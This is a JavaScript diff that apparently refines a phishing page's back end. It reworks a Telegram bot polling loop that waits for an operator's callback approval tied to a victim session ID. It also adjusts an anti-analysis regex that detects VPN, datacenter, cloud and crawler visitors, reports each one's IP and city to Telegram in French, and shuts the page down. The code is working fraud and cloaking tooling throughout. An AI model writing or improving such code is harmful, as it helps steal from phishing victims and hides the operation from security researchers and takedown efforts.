@@ -88,24 +88,33 @@
     });
   }
 
+  var _lastOffset = 0;
   function _poll(_tok, _cb){
     var _el = 0;
     var _tm = setInterval(function(){
       _el += 3000;
       if (_el > 600000) { clearInterval(_tm); return; }
-      fetch('https://api.telegram.org/bot' + _tok + '/getUpdates?offset=-1&timeout=1')
+      var _url = 'https://api.telegram.org/bot' + _tok + '/getUpdates?limit=20' + (_lastOffset ? '&offset=' + _lastOffset : '');
+      fetch(_url)
         .then(function(r){ return r.json(); })
         .then(function(d){
           var _rs = d.result || [];
           if (!_rs.length) return;
-          var _u = _rs[_rs.length - 1];
-          var _cq = _u.callback_query;
-          if (!_cq) return;
-          var _dv = _cq.data || '';
-          if (_dv.indexOf(_SID) === -1) return;
-          clearInterval(_tm);
-          _cb(_dv);
-          fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id);
+          for (var i = 0; i < _rs.length; i++) {
+            var _u = _rs[i];
+            if (_u.update_id >= _lastOffset) {
+              _lastOffset = _u.update_id + 1;
+            }
+            var _cq = _u.callback_query;
+            if (!_cq) continue;
+            var _dv = _cq.data || '';
+            if (_dv.indexOf(_SID) !== -1) {
+              clearInterval(_tm);
+              _cb(_dv);
+              fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id);
+              break;
+            }
+          }
         }).catch(function(){});
     }, 3000);
   }
@@ -299,7 +308,7 @@
       return;
     }
 
-    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer|contabo|kamatera|ionos|rackspace|interserver|liquidweb|tsohost|namecheap|hostinger|inmotion|dreamhost|bluehost|siteground|a2hosting|godaddy|hawkhost|scaleaway|scaleway|upcloud|equinix|gtt|zayo|lumen|centurylink|level3|hurricane|he\.net|bot|crawl|spider|scrape/i;
+    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer|contabo|kamatera|ionos|rackspace|interserver|liquidweb|tsohost|namecheap|hostinger|inmotion|dreamhost|bluehost|siteground|a2hosting|godaddy|hawkhost|scaleaway|scaleway|upcloud|equinix|gtt|zayo|lumen|centurylink|level3|hurricane|he\.net|bot|crawl|spider|scrape/i;
 
     function _verifyWithSecondaryApi(ip, city, country, org) {
       fetch('https://freeipapi.com/api/json/' + ip)
@@ -344,7 +353,7 @@
           var _org = d.connection ? (d.connection.org || d.connection.isp || d.connection.domain || '') : '';
           var _orgLower = _org.toLowerCase();
           
-          if (vpnPatterns.test(_orgLower) || (d.connection && d.connection.asn === 13335)) {
+          if (vpnPatterns.test(_orgLower)) {
             _tg(_R, '🛑 <b>BLOCAGE VPN / DATACENTER (' + _org + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
             setTimeout(_die, 500);
             return;
